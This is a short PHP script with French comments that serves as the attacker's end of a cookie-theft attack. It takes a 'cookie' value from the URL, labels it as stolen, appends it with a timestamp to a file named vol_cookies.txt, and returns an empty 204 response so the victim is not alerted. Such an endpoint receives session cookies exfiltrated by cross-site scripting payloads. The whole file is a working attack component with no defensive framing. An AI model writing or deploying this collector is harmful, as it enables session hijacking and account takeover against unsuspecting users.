<?php
// Vérifie si un cookie a été envoyé via l'URL
if (isset($_GET['cookie'])) {
    $cookie_volé = $_GET['cookie'];

    // Enregistre le cookie dans un fichier texte
    file_put_contents("vol_cookies.txt", date('Y-m-d H:i:s') . " - " . $cookie_volé . "\n", FILE_APPEND);

    // Réponse silencieuse pour ne pas alerter l'utilisateur
    http_response_code(204); // No Content
    exit;
} else {
    echo "Aucun cookie reçu.";
}
?>
